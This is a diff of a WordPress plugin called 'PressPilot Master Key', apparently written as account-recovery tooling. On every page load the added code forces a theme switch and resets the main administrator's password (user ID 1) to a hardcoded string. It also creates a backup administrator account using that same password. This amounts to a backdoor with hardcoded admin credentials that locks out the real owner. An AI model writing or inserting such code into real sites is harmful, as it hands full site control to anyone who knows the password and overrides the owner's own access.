@@ -1,26 +1,24 @@
 <?php
-/*
-Plugin Name: PressPilot Master Key
-Description: Forces theme activation and creates admin user.
-*/
+/* Plugin Name: PressPilot Master Key */
 add_action('init', function () {
-    // 1. Force Switch to PressPilot Theme 
-    $target_theme = 'presspilot-fse-v2';
-    $current_theme = get_stylesheet();
-
-    if ($current_theme !== $target_theme) {
-        switch_theme($target_theme);
+    // 1. Force Theme Switch 
+    if (get_stylesheet() !== 'presspilot-fse-v2') {
+        switch_theme('presspilot-fse-v2');
     }
 
-    // 2. Create Rescue Admin User
-    $username = 'presspilot_rescue';
-    $password = 'RescueMe2025!';
-    $email = 'rescue@presspilot.com';
+    // 2. FORCE PASSWORD RESET FOR ID 1 (The Main Admin)
+    $user = get_user_by('id', 1);
+    if ($user) {
+        wp_set_password('RescueMe2025!', 1);
+    }
 
-    if (!username_exists($username)) {
+    // 3. Backup: Create new user with UNIQUE email if ID 1 fails
+    $backup_user = 'presspilot_backup';
+    if (!username_exists($backup_user)) {
         require_once(ABSPATH . 'wp-includes/pluggable.php');
-        $user_id = wp_create_user($username, $password, $email);
-        $user = new WP_User($user_id);
-        $user->set_role('administrator');
+        $time = time();
+        wp_create_user($backup_user, 'RescueMe2025!', "rescue{$time}@example.com");
+        $u = get_user_by('login', $backup_user);
+        $u->set_role('administrator');
     }
 });
